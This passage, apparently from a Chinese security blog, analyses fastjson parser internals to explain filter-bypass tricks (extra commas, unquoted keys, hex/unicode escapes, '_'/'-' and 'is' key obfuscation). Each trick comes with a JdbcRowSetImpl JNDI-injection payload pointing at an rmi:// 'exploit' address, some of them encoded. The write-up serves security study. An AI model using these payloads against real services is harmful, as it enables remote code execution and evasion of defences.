<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 这个循环用于跳过空白字符和处理逗号（如果允许）。</span></span><br><span class="line"><span class="comment"> * 循环的目的是处理文本中的空白字符和逗号，确保在遇到逗号时能跳过它们，继续解析下一个有效的字符。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// 跳过当前的空白字符</span></span><br><span class="line">    lexer.skipWhitespace();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取当前字符</span></span><br><span class="line">    <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> lexer.getCurrent();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果启用了允许任意逗号的特性（即可以在元素之间有多余的逗号），则执行如下处理</span></span><br><span class="line">    <span class="keyword">if</span> (lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;</span><br><span class="line">        <span class="comment">// 当当前字符是逗号时，跳过它并继续处理下一个字符</span></span><br><span class="line">        <span class="keyword">while</span> (ch == <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">            lexer.next();  <span class="comment">// 跳过当前的逗号</span></span><br><span class="line">            lexer.skipWhitespace();  <span class="comment">// 跳过逗号后的空白字符</span></span><br><span class="line">            ch = lexer.getCurrent();  <span class="comment">// 获取下一个字符</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里可以添加的位置很多：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="字段名双引号替代"><a href="#字段名双引号替代" class="headerlink" title="字段名双引号替代"></a>字段名双引号替代</h2><p>在 fastjson 中，默认启用了两个与字段名解析相关的特性：</p>
<ul>
<li><p><code>AllowSingleQuotes</code>：允许使用单引号 <code>&#39;key&#39;: &#39;value&#39;</code> 形式；</p>
</li>
<li><p><code>AllowUnQuotedFieldNames</code>：允许字段名<strong>省略引号</strong>，例如 <code>dataSourceName: &quot;xxx&quot;</code> 是合法的。</p>
</li>
</ul>
<p>这两个特性虽然<strong>违反了标准 JSON 语法</strong>（RFC 8259 中字段名必须用双引号包裹），但 fastjson 为了兼容 JavaScript 风格或简化书写，<strong>默认将其开启</strong>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 扫描并返回“符号”（这里主要指对象字段名）。</span></span><br><span class="line"><span class="comment"> * 行为概览：</span></span><br><span class="line"><span class="comment"> * 1) 跳过前导空白；若下一个字符是引号（&quot; 或 &#x27;），按“带引号”字段名读取；</span></span><br><span class="line"><span class="comment"> * 2) 若遇到对象/逗号/EOF 的控制符，设置相应 token 并返回 null（表示此处没有字段名）；</span></span><br><span class="line"><span class="comment"> * 3) 否则按“未加引号字段名”处理：要求 Feature.AllowUnQuotedFieldNames 已启用；</span></span><br><span class="line"><span class="comment"> *    否则抛语法错误。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 注意：</span></span><br><span class="line"><span class="comment"> * - AllowUnQuotedFieldNames 仅影响“字段名（冒号左侧）是否可省略引号”，</span></span><br><span class="line"><span class="comment"> *   不影响“字符串值（冒号右侧）”——字符串值仍需按 JSON 规则写引号。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">scanSymbol</span><span class="params">(<span class="keyword">final</span> SymbolTable symbolTable)</span> &#123;</span><br><span class="line">    <span class="comment">// 跳过空白（空格、换行、制表、注释等，具体取决于 skipWhitespace 的实现）</span></span><br><span class="line">    skipWhitespace();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 情形一：双引号包裹的字段名  →  正统 JSON 语法</span></span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;&quot;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 情形二：✅单引号包裹的字段名  →  仅当开启 AllowSingleQuotes 时才允许</span></span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;\&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isEnabled(Feature.AllowSingleQuotes)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> scanSymbol(symbolTable, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 情形三：遇到对象右花括号 &#x27;&#125;&#x27; → 本位置并无字段名；推进一字符并设置 token</span></span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">        next();</span><br><span class="line">        token = JSONToken.RBRACE;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 情形四：遇到分隔逗号 &#x27;,&#x27; → 同样说明没有字段名（或上个键值对结束），返回 null</span></span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">        next();</span><br><span class="line">        token = JSONToken.COMMA;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 情形五：到达输入末尾 → 返回 null，并将 token 置为 EOF</span></span><br><span class="line">    <span class="keyword">if</span> (ch == EOI) &#123;</span><br><span class="line">        token = JSONToken.EOF;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 情形六：✅无引号字段名（非标准 JSON，但 fastjson 可选支持）</span></span><br><span class="line">    <span class="comment">// 若未开启 AllowUnQuotedFieldNames，则此处属于语法错误</span></span><br><span class="line">    <span class="keyword">if</span> (!isEnabled(Feature.AllowUnQuotedFieldNames)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取“未加引号”的字段名，直到遇到分隔字符（如冒号、逗号、空白、右花括号等）</span></span><br><span class="line">    <span class="keyword">return</span> scanSymbolUnQuoted(symbolTable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>下列 payload 中，<strong>字段名 <code>dataSourceName</code> 没有加引号</strong>，但依然合法 —— 这是因为 <code>AllowUnQuotedFieldNames</code> 默认是开启的：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  &#x27;@type&#x27;<span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">  dataSourceName<span class="punctuation">:</span> &#x27;rmi<span class="punctuation">:</span><span class="comment">//127.0.0.1:1099/exploit&#x27;,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p>其中 <code>AllowUnQuotedFieldNames</code> 仅在<strong>解析字段名</strong>时生效，即只影响<strong>冒号左边的字段名</strong>，不会影响值（冒号右边）的解析。而<strong>字段值仍然需要引号（单、双引号均可）</strong>，比如 <code>&quot;rmi://...&quot;</code>，否则会被当作标识符解析，解析失败或不符合预期。</p>
</li>
<li><p>对于特殊的字段例如 <code>@type</code>，不加引号会导致报错。这是因为 <code>scanSymbolUnQuoted(...)</code> 开头做了首字符校验：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">boolean</span>[] firstIdentifierFlags       = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">0</span>; c &lt; firstIdentifierFlags.length; ++c) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">                firstIdentifierFlags[c] = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">                firstIdentifierFlags[c] = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;_&#x27;</span> || c == <span class="string">&#x27;$&#x27;</span>) &#123;</span><br><span class="line">                firstIdentifierFlags[c] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">boolean</span>[] firstIdentifierFlags = IOUtils.firstIdentifierFlags;</span><br><span class="line"><span class="keyword">final</span> <span class="type">char</span> <span class="variable">first</span> <span class="operator">=</span> ch;</span><br><span class="line"><span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">firstFlag</span> <span class="operator">=</span> ch &gt;= firstIdentifierFlags.length || firstIdentifierFlags[first];</span><br><span class="line"><span class="keyword">if</span> (!firstFlag) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;illegal identifier : &quot;</span> + ch + info());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>IOUtils.firstIdentifierFlags</code> 里只把这些字符标记为<strong>可作为字段名首字符</strong>：</p>
<ul>
<li>英文字母 <code>A–Z / a–z</code></li>
<li>下划线 <code>_</code></li>
<li>美元符号 <code>$</code><br>（以及 <strong>非 ASCII</strong> 字符，因 <code>ch &gt;= 256</code> 会被视为 <code>true</code>）</li>
</ul>
<p>而 <strong><code>@</code> 不在允许集合</strong> 里，所以当你写未加引号的 <code>@type</code> 时会直接抛出：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSONException: illegal identifier : @</span><br></pre></td></tr></table></figure></div></li>
</ul>

    </div>
  </div>

<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>首先在 <code>com.alibaba.fastjson.parser.JSONLexerBase#scanSymbol</code>，当中可以看见，如果遇到了 <code>\u</code> 或者 <code>\x</code> 会有解码操作。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">chLocal = next();                <span class="comment">// 读取下一个字符到 chLocal，并推进全局游标 ch（next() 通常也会更新 ch）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"><span class="comment">// 如果读到反斜杠，说明进入转义序列处理</span></span><br><span class="line"><span class="keyword">if</span> (chLocal == <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    chLocal = next();            <span class="comment">// 读取反斜杠后的转义类型字符（如 &#x27;x&#x27; 或 &#x27;u&#x27;）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (chLocal) &#123;</span><br><span class="line">        <span class="comment">// [... 其他 case 省略 ...]</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>: &#123;</span><br><span class="line">            <span class="comment">// 非标准 JSON 的十六进制转义：\xHH （fastjson 兼容，H 为 0-9A-Fa-f）</span></span><br><span class="line">            <span class="comment">// 依次取两个十六进制字符</span></span><br><span class="line">            <span class="type">char</span> <span class="variable">x1</span> <span class="operator">=</span> ch = next();    <span class="comment">// 读取高 4 位的十六进制字符，同时更新全局 ch</span></span><br><span class="line">            <span class="type">char</span> <span class="variable">x2</span> <span class="operator">=</span> ch = next();    <span class="comment">// 读取低 4 位的十六进制字符，同时更新全局 ch</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// digits[]：把 ASCII 字符映射到 0..15（非十六进制字符通常映射为 -1）</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">x_val</span> <span class="operator">=</span> digits[x1] * <span class="number">16</span> + digits[x2];  <span class="comment">// 合成一个 0..255 的数值</span></span><br><span class="line">            <span class="type">char</span> <span class="variable">x_char</span> <span class="operator">=</span> (<span class="type">char</span>) x_val;                <span class="comment">// 按 8 位字符写入（只覆盖到 0x00..0xFF）</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 维护滚动哈希：一般用于符号表（SymbolTable）进行字段名驻留/查找</span></span><br><span class="line">            hash = <span class="number">31</span> * hash + (<span class="type">int</span>) x_char;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 追加到输出缓冲（构造中的字符串/字段名）</span></span><br><span class="line">            putChar(x_char);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>: &#123;</span><br><span class="line">            <span class="comment">// 标准 JSON 的 Unicode 转义：\uHHHH（4 个十六进制字符）</span></span><br><span class="line">            <span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> chLocal = next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> chLocal = next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> chLocal = next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c4</span> <span class="operator">=</span> chLocal = next();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将 4 个十六进制字符解析为一个 0..0xFFFF 的码点值</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> Integer.parseInt(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">char</span>[] &#123; c1, c2, c3, c4 &#125;), <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 同样更新滚动哈希</span></span><br><span class="line">            hash = <span class="number">31</span> * hash + val;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 以 16 位 char 写入（UTF-16 单元）；若是代理项（surrogate），高低位需由上层组合</span></span><br><span class="line">            putChar((<span class="type">char</span>) val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以通过编码绕过：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;\x64\x61\x74\x61\x53\x6f\x75\x72\x63\x65\x4e\x61\x6d\x65&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u0072\u006d\u0069\u003a\u002f\u002f\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031\u003a\u0031\u0030\u0039\u0039\u002f\u0065\u0078\u0070\u006c\u006f\u0069\u0074&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="对字段添加可忽略字符"><a href="#对字段添加可忽略字符" class="headerlink" title="对字段添加可忽略字符"></a>对字段添加可忽略字符</h2><h3 id="下划线和减号"><a href="#下划线和减号" class="headerlink" title="下划线和减号"></a>下划线和减号</h3><p>在 <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</code> 解析字段的 key 的时候调用了 <code>smartMatch</code>，该函数会将字段内的 <code>_</code> 和 <code>-</code> 替换为空。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">key2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; key.length(); ++i) &#123;</span><br><span class="line">    <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> key.charAt(i);</span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">        snakeOrkebab = <span class="literal">true</span>;</span><br><span class="line">        key2 = key.replaceAll(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">        snakeOrkebab = <span class="literal">true</span>;</span><br><span class="line">        key2 = key.replaceAll(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于这里有 <code>break</code>，不支持两个一起混合使用，只能单一使用其中一个，随便加。</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;d_a_t_aSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>1.2.36 版本及以后，<code>smartMatch</code> 改成了调用 <code>com.alibaba.fastjson.util.TypeUtils#fnv1a_64_lower</code>，该函数会忽略所有的 <code>_</code> 和 <code>-</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">fnv1a_64_lower</span><span class="params">(String key)</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">hashCode</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; key.length(); ++i) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> key.charAt(i);</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&#x27;_&#x27;</span> || ch == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">            ch = (<span class="type">char</span>) (ch + <span class="number">32</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        hashCode ^= ch;</span><br><span class="line">        hashCode *= <span class="number">0x100000001b3L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此这里可以在键名添加任意数量的 <code>_</code> 和 <code>-</code>。</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;aaa&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;bbb&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;d-a_t-a_SourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="属性前添加-is"><a href="#属性前添加-is" class="headerlink" title="属性前添加 is"></a>属性前添加 is</h3><p>1.2.36 版本之后会忽略属性的前缀 <code>is</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// smartMatchHashArrayMapping</span></span><br><span class="line"><span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> Arrays.binarySearch(smartMatchHashArray, smartKeyHash);</span><br><span class="line"><span class="keyword">if</span> (pos &lt; <span class="number">0</span> &amp;&amp; key.startsWith(<span class="string">&quot;is&quot;</span>)) &#123;</span><br><span class="line">    smartKeyHash = TypeUtils.fnv1a_64_lower(key.substring(<span class="number">2</span>));</span><br><span class="line">    pos = Arrays.binarySearch(smartMatchHashArray, smartKeyHash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>例如：</p>
